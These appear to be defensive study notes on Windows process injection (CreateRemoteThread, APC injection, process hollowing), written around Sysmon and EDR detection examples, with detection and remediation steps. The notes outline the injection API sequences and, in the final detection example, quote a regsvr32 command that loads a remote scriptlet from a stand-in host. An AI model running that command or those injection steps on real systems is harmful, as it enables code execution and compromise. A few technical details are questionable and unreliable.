Elaborated Notes with Examples
1. Process Injection — CreateRemoteThread

CreateRemoteThread is a classic process injection technique. The attacker uses OpenProcess to get a handle to a target process (e.g., explorer.exe, svchost.exe), VirtualAllocEx to allocate memory, WriteProcessMemory to write shellcode, then CreateRemoteThread to execute it in the target process context.

Example (Sysmon Event 8): Event ID 8 (CreateRemoteThread) shows SourceImage: C:\Users\victim\malware.exe, TargetImage: C:\Windows\System32\svchost.exe with StartAddress: 0x7FFA12340000 which is within the malware's allocated memory region (VirtualAllocEx allocation at 0x7FFA12340000). The WMI filter in Sysmon catches CreateRemoteThread where the calling process is not signed Microsoft. EDR alert: "Remote Thread Injection Detected in svchost.exe."
2. APC Injection

Asynchronous Procedure Call (APC) injection queues a malicious APC routine to a thread's APC queue. When the thread enters an alertable state (e.g., calling WaitForSingleObjectEx), the APC fires. Common targets: svchost.exe, explorer.exe, the ntdll!NtTestAlert path.

Example (Sysmon Event 8): SourceImage: C:\Users\victim\malware.exe uses QueueUserAPC to inject into explorer.exe thread ID 1234. Both Sysmon Event 8 and 25 (Process Tampering) fire. The APC start address points to a C:\Windows\Temp\malicious.dll that was written 2 seconds earlier. In memory analysis with Volatility: apcScan shows kernel APC objects queued to explorer.exe threads. The APC code decrypts C2 configuration at runtime.
3. Process Hollowing

Process hollowing replaces the legitimate memory of a process (e.g., svchost.exe launched in a suspended state) with malicious code using NtUnmapViewOfSection or ZwUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, SetThreadContext, and ResumeThread.

Example (Sysmon Event 1 + 8): Event ID 1: svchost.exe (PID: 3456) created by malware.exe (PID: 1234) with command line "C:\Windows\System32\svchost.exe -k netsvcs". The entry point is suspicious: 0x1000 instead of the usual 0x1C0000 range for legitimate svchost. Event ID 8 shows a thread starting at 0x1000 in PID 3456. The malware hollowed out the fresh svchost process and injected its own code.
4. Detection & Remediation

Detection: Sysmon Events 1 (process creation), 8 (CreateRemoteThread), 10 (process access), 11 (file create), and 12-14 (registry events). EDR hooks critical APIs (NtCreateThreadEx, NtQueueApcThread). Memory scanning detects injected code regions. Remediation: kill malicious processes, remove persistence, isolate host, rebuild from known-good image.

Example Detection: EDR alert: "Process Injection — CreateRemoteThread detected." Investigation shows:
- Source: outlook.exe (PID 4000) — Office product, unusual parent for injection.
- Target: regsvr32.exe (PID 5000) — spawned by Outlook with /s /n /u /i:hxxp://evil/script.sct (SCT file-based execution).
- Sysmon Event 1 shows the command line.
- Sysmon Event 13 shows regsvr32.exe accessing HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
Remediation: Isolate both endpoints. Kill PID 5000 and 4000. Remove registry key. Reset the user's password. Scan for additional implants. Block evil[.]com on the firewall. Submit sample to sandbox for full analysis.
